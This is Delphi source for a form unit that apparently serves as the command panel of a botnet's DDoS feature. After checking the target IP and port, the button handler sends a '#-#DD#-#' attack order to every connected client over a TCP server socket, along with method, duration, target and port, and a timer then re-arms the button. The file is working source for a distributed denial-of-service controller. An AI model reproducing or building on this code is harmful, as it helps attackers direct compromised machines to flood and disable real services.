unit Panel;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.StdCtrls, sEdit,
  sComboBox, sLabel, sGroupBox, Vcl.ExtCtrls;

type
  TForm3 = class(TForm)
    sGroupBox1: TsGroupBox;
    sLabel2: TsLabel;
    sLabel3: TsLabel;
    Button1: TButton;
    sGroupBox2: TsGroupBox;
    StatusBar1: TStatusBar;
    ListView1: TListView;
    Edit2: TEdit;
    Edit3: TEdit;
    Label1: TLabel;
    Label2: TLabel;
    ComboBox1: TComboBox;
    Label3: TLabel;
    ComboBox2: TComboBox;
    Label4: TLabel;
    Timer1: TTimer;
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Button1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

{$R *.dfm}

uses
  TCPServer;

function IsIp(ip: string): Boolean;
var
  i, j: Integer;
begin
  Result := False;
  j := 0;
  if ip.Length > 16 then
  begin
    Exit;
  end;
  for i := 1 to ip.Length do
  begin
    if ip[i] = '.' then
      inc(j);
  end;
  if j = 3 then
    Result := True;
end;

procedure TForm3.Button1Click(Sender: TObject);
var
j,n,g1,g2: Integer;

Item: TListItem;
today: TDateTime;
begin



  today := Time;

  if Form1.ServerSocket1.Socket.ActiveConnections = 0 then
  begin
   ShowMessage('There are no users on the network.');
   Exit;
  end;

  if IsIp(Edit2.Text) = False then
  begin
    ShowMessage('You did not write an ip address or the input field is not an ip address.');
    Exit;
  end;

  if Edit3.Text = '' then
  begin
    ShowMessage('You did not specify a port.');
    Exit;
  end;

  try
    n := StrToInt(Edit3.Text);
  except
    Showmessage('Enter the port in the input field.');
    Exit;
  end;

  Form3.Button1.Enabled := False;

  for j := 0 to Form1.ServerSocket1.Socket.ActiveConnections - 1 do
  begin
      try
       Form1.ServerSocket1.Socket.Connections[j].SendText('#-#DD#-#' + #13#10 + ComboBox1.Text + #13#10 + ComboBox2.Text + #13#10 + Edit2.Text + #13#10 + Edit3.Text);
      except
       Application.ProcessMessages;
      end;
  end;

  Form3.ListView1.Clear;

  Item := TListItem.Create(Form3.ListView1.Items);
  Item.Caption := Edit2.Text;
  Item.SubItems.Add(Edit3.Text);
  Item.SubItems.Add(ComboBox1.Text);
  Item.SubItems.Add(ComboBox2.Text);
  Item.SubItems.Add(TimeToStr(today));
  Form3.ListView1.Items.Insert(0);
  Form3.ListView1.Items.Item[0] := Item;
  FreeAndNil(Item);

  g1 := StrToInt(ComboBox2.Text);
  g2 := g1 * 60000;
  Form3.Timer1.Interval := g2;
  Form3.Timer1.Enabled := True;

end;

procedure TForm3.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
Form3.Close;
end;

procedure TForm3.Timer1Timer(Sender: TObject);
begin
Form3.ListView1.Clear;
Form3.Button1.Enabled := True;
Form3.Timer1.Enabled := False;
end;

end.
